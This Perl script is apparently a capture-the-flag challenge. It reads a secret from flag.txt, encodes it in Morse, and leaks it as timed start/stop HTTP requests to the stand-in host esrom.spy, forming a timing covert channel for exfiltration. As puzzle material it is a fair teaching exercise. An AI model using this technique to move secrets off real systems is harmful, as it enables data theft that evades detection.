#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use Time::HiRes qw/ sleep /;
use constant {DOT => 0.4};

my %code = (
	'a' => '.-',
	'b' => '-...',
	'c' => '-.-.',
	'd' => '-..',
	'e' => '.',
	'f' => '..-.',
	'g' => '--.',
	'h' => '....',
	'i' => '..',
	'j' => '.---',
	'k' => '-.-',
	'l' => '.-..',
	'm' => '--',
	'n' => '-.',
	'o' => '---',
	'p' => '.--.',
	'q' => '--.-',
	'r' => '.-.',
	's' => '...',
	't' => '-',
	'u' => '..-',
	'v' => '...-',
	'w' => '.--',
	'x' => '-..-',
	'y' => '-.--',
	'z' => '--..',

	'0' => '-----',
	'1' => '.----',
	'2' => '..---',
	'3' => '...--',
	'4' => '....-',
	'5' => '.....',
	'6' => '-....',
	'7' => '--...',
	'8' => '---..',
	'9' => '----.',
	
	'.' => '.-.-.-',
	'!' => '-.-.--',
	',' => '--..--',
	"\t" => '-...-',
	'_' => '..--.-'
);

sub encryptChar($) {
	return $code{lc $_[0]};
}

open IN, '<flag.txt' or die "can't open flag file: $!\n";
my $flag = <IN>;
chomp $flag;
close IN;

my $ua = LWP::UserAgent -> new();
$ua -> agent('secret spy script');

my $req;

for (split //, $flag) {
	my $code = encryptChar($_);
	for (split //, $code) {
		$req = HTTP::Request->new(GET => 'http://esrom.spy/startSignal');
		$ua->request($req);
		sleep(($_ eq '.' ? DOT : 3 * DOT) + 0.1 - int rand 0.05);
		$req = HTTP::Request->new(GET => 'http://esrom.spy/stopSignal');
		$ua->request($req);
		sleep(DOT + 0.1 - int rand 0.05);
	}
	sleep(2 * DOT + 0.1 - int rand 0.05);
}
